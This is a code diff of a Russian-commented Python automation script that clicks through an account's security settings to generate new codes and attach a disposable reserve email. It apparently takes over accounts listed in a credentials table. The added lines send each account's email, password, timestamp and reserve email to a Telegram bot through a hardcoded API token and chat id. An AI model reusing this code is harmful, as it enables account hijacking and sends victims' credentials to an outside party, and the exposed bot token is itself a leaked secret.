@@ -2,6 +2,7 @@ import keyboard, random
 from pyautogui import*
 from tqdm import tqdm
 import requests, time
+from datetime import*
 from keyboard import*
 import time
 from mailtm import*
@@ -28,6 +29,7 @@ for i in range(len(list_of_accs_inf)):
     if ip_address in list_of_accs_inf[i]:
         account_email = list_of_accs_inf[i][:list_of_accs_inf[i].find('\t')]
         account_password = list_of_accs_inf[i][list_of_accs_inf[i].find('\t') + 1:list_of_accs_inf[i].rfind('\t')]
+        stroka_acca = list_of_accs_inf[i]
         print('Аккаунт найден:', list_of_accs_inf[i], ' - положение в таблице || \n')
         print('Текущая выдача данных: ', account_email, account_password, ip_address, '|| Сверка пройдена!')
         print('Даю время на валидацию и начинаю... (30 seconds)');
@@ -100,6 +102,14 @@ click(1010, 362, 1, 0, 'left'); click(806, 142, 1, 0, 'left'); sleep(11) # за�
 click(717, 621, 1, 0, 'left'); sleep(15); # переходим в секьюрити
 scroll(-3200); sleep(2); click(123, 725, 1, 0, 'left'); sleep(7); click(491, 551, 1, 0, 'left'); sleep(2) # скролим вниз и генерим новый код и подтверждаем
 click(132, 17, 1, 0, 'left'); sleep(2); click(224, 234, 1, 0, 'left'); sleep(7); click(116, 105, 1, 0, 'left'); # обновляем страничку азур путем кликами по иконкам :)
+################# ОТПРАВЛЕНИЕ ДАННЫХ В ТГ БОТ BOTINOK 
+TOKEN = "6619003611:AAGRivvPR1q5XZbnNh0RgZ5Y86_FBlpkTOE"
+now_time = str(datetime.now())
+chat_id = '506640934'
+message = stroka_acca + '\n' +  now_time + '\n' +  email_reserve
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # Эта строка отсылает сообщение
+##################
 print('ГОТОВО. АККАУНТ ЗАПРИВАЧЕН)\n\n'
       'резервная почта аккаунта:', email_reserve)
 sleep(7200)
